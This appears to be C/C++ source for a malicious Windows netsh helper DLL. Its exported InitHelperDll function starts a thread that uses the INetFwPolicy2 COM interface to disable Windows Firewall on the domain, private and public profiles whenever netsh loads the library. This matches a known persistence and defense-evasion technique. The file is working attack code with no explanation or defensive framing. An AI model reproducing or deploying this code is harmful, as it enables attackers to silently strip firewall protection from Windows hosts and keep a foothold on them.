#include <stdio.h>
#include <windows.h>
#include <netfw.h>

#pragma comment( lib, "ole32.lib" )

DWORD WINAPI Helper(LPVOID lpParameter) {

    // Initialize COM.
    HRESULT hrComInit = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
    if (FAILED(hrComInit)) {
        // If initialization of COM failed, print an error message.
        printf("CoInitializeEx failed: 0x%08lx\n", hrComInit);
        return 1;
    }

    INetFwPolicy2* pNetFwPolicy2 = NULL;

    // Create an instance of the INetFwPolicy2 interface.
    HRESULT hr = S_OK;
    hr = CoCreateInstance(
        __uuidof(NetFwPolicy2),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwPolicy2),
        (void**)&pNetFwPolicy2
    );
    if (FAILED(hr)) {
        printf("CoCreateInstance failed: 0x%08lx\n", hr);
        CoUninitialize();
        return 1;
    }

    // Disable Windows Firewall for all profiles.
    hr = pNetFwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_DOMAIN, FALSE);
    if (FAILED(hr)) {
        printf("Domain Profile failed: 0x%08lx\n", hr);
        goto Cleanup;
    }
    hr = pNetFwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_PRIVATE, FALSE);
    if (FAILED(hr)) {
        printf("Private Profile failed: 0x%08lx\n", hr);
        goto Cleanup;
    }
    hr = pNetFwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_PUBLIC, FALSE);
    if (FAILED(hr)) {
        printf("Public Profile failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

    Cleanup:
    // Release INetFwPolicy2
    if (pNetFwPolicy2 != NULL) {
        pNetFwPolicy2->Release();
    }

    // Uninitialize COM.
    if (SUCCEEDED(hrComInit)) {
        CoUninitialize();
    }

    return 0;
}

extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved){
    HANDLE hand;
    hand = CreateThread(NULL, 0, Helper, NULL, 0, NULL);
    CloseHandle(hand);

    return NO_ERROR;
}